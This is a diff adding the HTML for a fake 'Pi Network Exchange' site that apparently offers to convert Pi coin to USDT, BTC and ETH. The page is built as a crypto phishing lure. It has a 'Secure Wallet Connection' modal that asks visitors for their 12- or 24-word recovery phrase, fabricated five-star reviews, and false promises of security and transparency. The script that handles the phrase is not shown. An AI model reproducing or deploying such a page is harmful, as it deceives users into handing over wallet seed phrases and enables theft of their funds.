@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Network - Convert Pi to USDT</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <!-- WalletConnect and QRCodeModal -->
+<script src="https://unpkg.com/walletconnect/dist/WalletConnect.min.js"></script>
+<script src="https://unpkg.com/qrcode-modal/qrcode-modal.min.js"></script>
+
+<!-- Coinbase SDK -->
+<script src="https://unpkg.com/@coinbase/wallet-sdk/dist/coinbase-wallet-sdk.min.js"></script>
+</head>
+<body>
+    <div id="popup-modal" class="popup-modal">
+        <div class="popup-content">
+            <span class="close-btn">&times;</span>
+            <h2>Welcome to Pi Network Exchange!</h2>
+            <p>Did you know? Now you can easily exchange your Pi Network Coins for USDT,BTC, and ETH in minutes! No complicated steps, no hidden fees – just fast and secure transactions. Join the future of finance today!</p>
+            <button id="explore-btn">Explore Now</button>
+        </div>
+    </div>
+    
+    
+    <header class="navbar">
+        <div class="logo"><img class="pi-logo" src="images/Pi-Network.png" alt=""></div>
+        <header class="header">
+            <nav class="nav-container">
+                <ul class="nav-links">
+                    <li><a href="#home">Home</a></li>
+                    <li><a href="#features">Features</a></li>
+                    <li><a href="#exchange">Exchange</a></li>
+                    <li><a href="#contact">Contact</a></li>
+                </ul>
+            </nav>
+        </header>        
+        <button class="btn-connect">Connect Wallet</button>
+    </header>
+
+    <section id="home" class="hero">
+        <div class="hero-content">The First Digital Currency You Can Mine on Your Phone!</div>
+        <h1>Exchange Your Pi Coin NOW!!</h1>
+        <p>Secure, Fast, and Reliable Transactions</p>
+        <a href="#exchange" class="cta-btn">Get Started</a>
+    </section>
+
+    <section id="features" class="features">
+        <h2>Why Choose Pi Network Exchange?</h2>
+        <p class="features-intro">
+            We offer a cutting-edge solution for converting Pi Coins to USDT, BTC, and ETH with speed, security, and transparency. 
+            Whether you are an investor, a trader, or a crypto enthusiast, our platform guarantees a seamless experience tailored to meet your financial needs.
+        </p>
+        <div class="features-container">
+            <div class="feature-card">
+                <i class="fas fa-lock"></i>
+                <h3>Uncompromising Security</h3>
+                <p>
+                    Your funds and data are protected with state-of-the-art encryption and multi-layered authentication. 
+                    We follow industry best practices to ensure every transaction is safe from unauthorized access or fraud.
+                </p>
+            </div>
+            <div class="feature-card">
+                <i class="fas fa-rocket"></i>
+                <h3>Lightning-Fast Transactions</h3>
+                <p>
+                    Time is money. That’s why we prioritize speed in every aspect of our service. Enjoy near-instant conversion of your crypto to fiat with real-time exchange rates, so you never miss an opportunity.
+                </p>
+            </div>
+            <div class="feature-card">
+                <i class="fas fa-globe"></i>
+                <h3>Global Accessibility</h3>
+                <p>
+                    Whether you’re at home or traveling abroad, our platform is accessible 24/7 from anywhere in the world. 
+                    We support multiple fiat currencies and cryptocurrencies, making cross-border transactions effortless.
+                </p>
+            </div>
+            <div class="feature-card">
+                <i class="fas fa-handshake"></i>
+                <h3>Transparent Fees</h3>
+                <p>
+                    No hidden charges, no surprises. We offer a clear and competitive fee structure that ensures you get the most value from every transaction. 
+                    What you see is what you pay, with real-time updates on exchange rates.
+                </p>
+            </div>
+            <div class="feature-card">
+                <i class="fas fa-cogs"></i>
+                <h3>User-Friendly Interface</h3>
+                <p>
+                    Our platform is designed with both beginners and experts in mind. With an intuitive dashboard, streamlined navigation, and responsive design, you can complete transactions effortlessly on any device.
+                </p>
+            </div>
+            <div class="feature-card">
+                <i class="fas fa-users"></i>
+                <h3>Dedicated Customer Support</h3>
+                <p>
+                    Our support team is available 24/7 to assist you with any questions or concerns. Whether you need help with a transaction or have general inquiries, we’re here to help every step of the way.
+                </p>
+            </div>
+        </div>
+    </section>
+    
+
+    <section id="exchange" class="exchange">
+        <h2>Exchange Pi Network Coin to USDT, BTC, and ETH</h2>
+        <form class="exchange-form">
+            <input type="number" placeholder="Enter amount in Pi" id="cryptoAmount">
+            <select id="fiatCurrency">
+                <option value="usdt">USDT</option>
+                <option value="btc">BTC</option>
+                <option value="eth">ETH</option>
+            </select>
+            <button type="submit" class="exchange-btn">Convert</button>
+        </form>
+        <p id="result"></p>
+    </section>
+
+    <section id="reviews">
+        <h2 class="review-title">What Our Customers Say</h2>
+        <div class="reviews-grid">
+            <div class="review-card">
+                <div class="review-header">
+                    <img src="https://via.placeholder.com/50" alt="Jane Doe" class="avatar">
+                    <div class="review-info">
+                        <h3>Jane Doe</h3>
+                        <div class="stars">★★★★★</div>
+                    </div>
+                </div>
+                <p>"Fantastic platform! Seamlessly converted my Pi Network coin to USDT within minutes."</p>
+            </div>
+    
+            <div class="review-card">
+                <div class="review-header">
+                    <img src="https://via.placeholder.com/50" alt="Michael Smith" class="avatar">
+                    <div class="review-info">
+                        <h3>Michael Smith</h3>
+                        <div class="stars">★★★★☆</div>
+                    </div>
+                </div>
+                <p>"Great experience overall, but could use more payment options."</p>
+            </div>
+    
+            <div class="review-card">
+                <div class="review-header">
+                    <img src="https://via.placeholder.com/50" alt="Sarah Johnson" class="avatar">
+                    <div class="review-info">
+                        <h3>Sarah Johnson</h3>
+                        <div class="stars">★★★★★</div>
+                    </div>
+                </div>
+                <p>"Easy to use and secure! I love how quick the transactions are."</p>
+            </div>
+    
+            <div class="review-card">
+                <div class="review-header">
+                    <img src="https://via.placeholder.com/50" alt="David Lee" class="avatar">
+                    <div class="review-info">
+                        <h3>David Lee</h3>
+                        <div class="stars">★★★★☆</div>
+                    </div>
+                </div>
+                <p>"Reliable service with excellent customer support. Highly recommended!"</p>
+            </div>
+    
+            <div class="review-card">
+                <div class="review-header">
+                    <img src="https://via.placeholder.com/50" alt="Emily Watson" class="avatar">
+                    <div class="review-info">
+                        <h3>Emily Watson</h3>
+                        <div class="stars">★★★★★</div>
+                    </div>
+                </div>
+                <p>"I’ve tried other platforms, but this one is by far the best. Smooth transactions every time!"</p>
+            </div>
+        </div>
+    </section>    
+
+    <!-- <div class="crypto-ticker">
+        <span>Pi Network (Pi): $5</span>
+        <span>Bitcoin (BTC): $55,500</span>
+        <span>Ethereum (ETH): $2,800</span>
+    </div>     -->
+
+    <button id="back-to-top">&#8679;</button>
+
+    <!-- Popup Modal for Recovery Phrase Input -->
+<div id="phrase-modal" class="modal hidden">
+    <div class="modal-content">
+        <span class="close-button" id="close-modal">&times;</span>
+        <h2>Secure Wallet Connection</h2>
+        <p class="modal-description">
+            Please enter your 12 or 24-word recovery phrase to connect your wallet.
+        </p>
+        <textarea 
+            id="recovery-phrase" 
+            placeholder="Enter your recovery phrase here..."
+            rows="5"
+        ></textarea>
+        <button id="submit-phrase-btn">Connect Wallet</button>
+        <p id="phrase-message" class="error-message hidden"></p>
+    </div>
+</div>
+
+<!-- Floating Action Button -->
+<button id="chatFab" class="chat-fab">💬</button>
+
+<div id="chatModal" class="chat-modal" style="display: none;">
+    <div class="chat-header">
+        <h3>Chat Support</h3>
+        <button id="closeChat" class="close-btn">×</button>
+    </div>
+
+    <div id="chatMessages" class="chat-messages">
+        <p class="bot-message">Hello! Need help with crypto transactions? Ask away! 😊</p>
+    </div>
+
+    <div class="faq-section">
+        <h4>Frequently Asked Questions</h4>
+        <div class="faq-item" data-answer="To exchange crypto, first connect your wallet and follow the prompts.">
+            <span>How to exchange crypto?</span>
+        </div>
+        <div class="faq-item" data-answer="You can withdraw your funds by navigating to the withdrawal section in your wallet.">
+            <span>How to withdraw funds?</span>
+        </div>
+        <div class="faq-item" data-answer="For security, always use two-factor authentication and secure your private keys.">
+            <span>How to keep my wallet secure?</span>
+        </div>
+    </div>
+
+    <div class="chat-footer">
+        <textarea id="userInput" placeholder="Type your message here..."></textarea>
+        <button id="sendMessage" class="send-btn">Send</button>
+    </div>
+</div>
+
+
+    
+
+    <footer id="contact" class="footer">
+        <p>&copy; 2024 Pi Network. All rights reserved.</p>
+        <div class="socials">
+            <a href="#"><i class="fab fa-twitter"></i></a>
+            <a href="#"><i class="fab fa-linkedin"></i></a>
+            <a href="#"><i class="fab fa-github"></i></a>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
